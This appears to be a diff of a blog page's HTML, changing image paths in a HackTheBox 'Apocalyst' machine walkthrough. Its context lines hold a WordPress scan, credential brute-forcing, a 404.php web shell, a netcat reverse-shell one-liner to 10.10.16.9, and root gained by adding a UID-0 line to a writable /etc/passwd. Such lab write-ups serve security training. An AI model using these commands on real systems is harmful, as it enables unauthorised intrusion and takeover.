@@ -38,7 +38,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds
-</code></pre><ul><li>Web Server</li></ul><p><img src=./images/1.png></p><ul><li>If we add <code>apocalyst.htb</code> to <code>/etc/hosts</code>, we have a fixed web page</li></ul><p><img src=./images/2.png></p><ul><li><code>wpscan</code></li></ul><pre tabindex=0><code>└─$ wpscan --url http://apocalyst.htb/ -e ap,t,tt,u
+</code></pre><ul><li>Web Server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/images/1.png></p><ul><li>If we add <code>apocalyst.htb</code> to <code>/etc/hosts</code>, we have a fixed web page</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/images/2.png></p><ul><li><code>wpscan</code></li></ul><pre tabindex=0><code>└─$ wpscan --url http://apocalyst.htb/ -e ap,t,tt,u
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -278,7 +278,7 @@ Total time: 0
 Processed Requests: 546
 Filtered Requests: 545
 Requests/sec.: 0
-</code></pre><ul><li>Page</li></ul><p><img src=./images/4.png></p><ul><li>Download the image and run <code>steghide</code><ul><li>Empty password</li></ul></li></ul><pre tabindex=0><code>└─$ steghide extract -sf apocalyst.jpg 
+</code></pre><ul><li>Page</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/images/4.png></p><ul><li>Download the image and run <code>steghide</code><ul><li>Empty password</li></ul></li></ul><pre tabindex=0><code>└─$ steghide extract -sf apocalyst.jpg 
 Enter passphrase: 
 wrote extracted data to &#34;list.txt&#34;.
 </code></pre><pre tabindex=0><code>└─$ head list.txt                                     
@@ -312,7 +312,7 @@ Trying falaraki / total Time: 00:00:24 &lt;=====================================
 [+] Data Received: 1.607 MB
 [+] Memory used: 238.828 MB
 [+] Elapsed time: 00:00:40
-</code></pre><ul><li>Use the creds to access <code>admin.php</code></li></ul><p><img src=./images/5.png></p><ul><li>We can edit <code>404.php</code> template</li></ul><p><img src=./images/6.png></p><ul><li>Now we have to find a page that will trigger <code>404</code> error code</li></ul><p><img src=./images/7.png></p><ul><li>And we have our web shell</li></ul><p><img src=./images/8.png></p><ul><li>Let&rsquo;s get reverse shell<ul><li>url-encode <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&amp;1|nc 10.10.16.9 6666 >/tmp/f</code></li></ul></li></ul><p><img src=./images/9.png></p><h2 id=root>Root</h2><ul><li><code>/etc/passwd</code> is writable</li></ul><pre tabindex=0><code>╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+</code></pre><ul><li>Use the creds to access <code>admin.php</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/images/5.png></p><ul><li>We can edit <code>404.php</code> template</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/images/6.png></p><ul><li>Now we have to find a page that will trigger <code>404</code> error code</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/images/7.png></p><ul><li>And we have our web shell</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/images/8.png></p><ul><li>Let&rsquo;s get reverse shell<ul><li>url-encode <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&amp;1|nc 10.10.16.9 6666 >/tmp/f</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/images/9.png></p><h2 id=root>Root</h2><ul><li><code>/etc/passwd</code> is writable</li></ul><pre tabindex=0><code>╔══════════╣ Permissions in init, init.d, systemd, and rc.d
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                                                             
                                                                                                                                                                                                                                             
 ═╣ Hashes inside passwd file? ........... No
@@ -327,7 +327,7 @@ Trying falaraki / total Time: 00:00:24 &lt;=====================================
 </code></pre><ul><li>Let&rsquo;s create a user</li></ul><pre tabindex=0><code>└─$ openssl passwd -1 pentest
 $1$2pMfZqDY$iE5J/GYlP4weF/pnpYuzH1
 </code></pre><ul><li>Add line in <code>/etc/passwd</code><ul><li><code>[user]:[hash including $[type]$[salt]$[hash]]:[userid]:[groupid]:[comment]:[homedir]:[shell]</code></li></ul></li></ul><pre tabindex=0><code>pentest:$1$2pMfZqDY$iE5J/GYlP4weF/pnpYuzH1:0:0:pentest:,,,:/root:/bin/bash
-</code></pre><ul><li>Change user and get <code>root.txt</code></li></ul><p><img src=./images/10.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><ul><li>Change user and get <code>root.txt</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/images/10.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fapocalyst%2f&text=%5bHTB%5d%20Machine%3a%20Apocalyst&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
 </a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fapocalyst%2f&title=%5bHTB%5d%20Machine%3a%20Apocalyst" target=_blank><i class="fab fa-reddit"></i>
 </a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fapocalyst%2f&title=%5bHTB%5d%20Machine%3a%20Apocalyst" target=_blank><i class="fab fa-linkedin"></i>
